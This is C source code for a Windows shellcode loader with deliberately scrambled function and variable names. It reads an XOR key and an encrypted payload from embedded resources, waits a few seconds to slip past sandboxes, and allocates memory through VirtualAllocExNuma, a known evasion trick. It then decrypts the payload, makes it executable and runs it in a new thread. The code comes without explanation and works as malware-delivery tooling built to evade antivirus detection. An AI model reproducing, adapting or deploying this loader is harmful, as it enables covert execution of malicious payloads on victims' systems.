
#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void resloamadappa(const char* enapparename, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, enapparename, RT_RCDATA);

    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}







void daggerman1999kum(char* coddmanku1, DWORD lenofcod1, unsigned char* ke44y5, DWORD k2e3y1en) {
    for (DWORD ma1su = 0; ma1su < lenofcod1; ma1su++) {
        coddmanku1[ma1su] ^= ke44y5[ma1su % k2e3y1en]; 
    }
}


int main() {
    Sleep(2500);

    char* kkeyakesey;
    DWORD kkeyakeseyLen;
    resloamadappa("dhanushkey1", &kkeyakesey, &kkeyakeseyLen);

    char* kkcode;
    DWORD kkcodeLen;
    resloamadappa("dhanushcode56", &kkcode, &kkcodeLen);

    LPVOID sirajpura = VirtualAllocExNuma(GetCurrentProcess(), NULL, kkcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
    //dhanushaes(AESCode, AESCodeLen, AESkey, AESkeyLen);
    daggerman1999kum(kkcode, kkcodeLen, kkeyakesey , kkeyakeseyLen);

    memcpy(sirajpura, kkcode, kkcodeLen);
    DWORD oldProtect;
    VirtualProtect(sirajpura, kkcodeLen, PAGE_EXECUTE_READ, &oldProtect);

    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sirajpura, NULL, 0, NULL);
    WaitForSingleObject(tHandle, INFINITE);

    return 0;
}
